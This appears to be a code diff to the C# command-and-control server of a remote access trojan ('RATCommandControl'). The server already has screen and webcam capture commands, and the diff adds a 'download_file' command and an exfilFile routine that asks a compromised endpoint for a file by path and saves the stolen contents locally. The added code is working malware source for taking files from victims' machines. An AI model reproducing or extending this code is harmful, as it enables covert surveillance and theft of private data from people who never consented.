@@ -84,6 +84,7 @@ namespace RATCommandControl
             commandIndex.Add("screen");
             commandIndex.Add("webcam_capture");
             commandIndex.Add("upload_file");
+            commandIndex.Add("download_file");
             EndPoint selectedEndpoint = null;
             String commandString = null;
             String currentEndpointString = "no endpoint selected!";
@@ -194,6 +195,28 @@ namespace RATCommandControl
                     }
                     
                     
+                }
+                else if (commandString.StartsWith("download_file"))
+                {
+                    if (selectedEndpoint == null)
+                    {
+                        Console.WriteLine("Error: No endpoint selected");
+                    }
+                    else
+                    {
+                        String[] args = commandString.Split(' ');
+                        try
+                        {
+                            String path = args[1];
+                            exfilFile(path, selectedEndpoint);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("Error occurred in processing of command, format is upload_file <path>");
+                        }
+                    }
+
+
                 }
 
 
@@ -483,6 +506,80 @@ namespace RATCommandControl
             packetToSend += command;
             packAndSend(packetToSend, selectedEndpoint);
             
+        }
+
+        static void exfilFile(String path, EndPoint e)
+        {
+            byte[] genericRecieve = { (byte)(char)4 };
+            Console.WriteLine("Processing File...");
+            byte[] confBytes = new byte[1];
+            //Begin socket handling
+
+            int endpointIndex = connectedEndPoints.IndexOf(e);
+            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
+            String query = "exf1l";
+            query += (char)4;
+            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
+            usingSock.Send(queryBytes);
+            usingSock.Receive(confBytes);
+            Console.WriteLine("Startup confirmation recieved");
+
+            //end socket handling
+            byte[] pathBytes = Encoding.ASCII.GetBytes(path);
+            usingSock.Send(pathBytes);
+            Console.WriteLine("path sent");
+
+            byte[] fileNameBytes = new byte[64];
+            Console.WriteLine("awaiting file name");
+            int fileNameLen = usingSock.Receive(fileNameBytes);
+            String fileName = Encoding.ASCII.GetString(fileNameBytes,0,fileNameLen);
+            usingSock.Send(confBytes);
+            Console.WriteLine("File name recieved");
+            //Deal with file size
+            byte[] fileSizeBytes = new byte[64];
+            int fileSizeDigits = usingSock.Receive(fileSizeBytes);//Recieve size of file
+            usingSock.Send(genericRecieve);
+            String fileSizeString = Encoding.ASCII.GetString(fileSizeBytes, 0, fileSizeDigits);
+            long fileSize = long.Parse(fileSizeString);
+            //Done dealing with file size
+
+            byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
+            List<byte> fileBytesList = new List<byte>();
+            byte[] fileBytesArray = new byte[1024];//store a kilobyte of file at a time
+            while (true)
+            {
+                int recievedByteCount = usingSock.Receive(fileBytesArray);//recieve into fileBytesArray
+                usingSock.Send(genericRecieve); //ACK the chunk
+                String recievedBytes = Encoding.ASCII.GetString(fileBytesArray, 0, recievedByteCount);
+                if (recievedByteCount < 1024 || recievedBytes.Contains("♦♦endOfFile♦♦"))//if we see a fishy packet/one that contains the end of file identifier...
+                {
+                    Console.WriteLine("END OF FILE REACHED"); //DEBUGSTATEMENT
+                    for (int i = 0; i < recievedByteCount; i++)
+                    {
+                        fileBytesList.Add(fileBytesArray[i]);//Should only add until recievedBytes, which is ideally less than 1024
+                    }
+                    break;
+                }
+                else if (recievedBytes.Contains("fileError♦"))
+                {
+                    Console.WriteLine("An error occurred on the client");
+                    return;
+                }
+                for (int i = 0; i < recievedByteCount; i++)
+                {
+                    fileBytesList.Add(fileBytesArray[i]);//Adds all 1024 bytes
+                }
+            }
+            foreach (byte b in terminator)
+            {
+                fileBytesList.RemoveAt(fileBytesList.ToArray().Length - 1); //Remove the file terminator from the file
+            }
+
+
+            FileStream f = File.Open(fileName, FileMode.OpenOrCreate, FileAccess.Write);
+            usingSock.Send(genericRecieve); //Sends final confirmation
+            f.Write(fileBytesList.ToArray(), 0, ((int)fileSize - terminator.Length));//write out the file
+            f.Close();
         }
         static void Main(string[] args)
         {
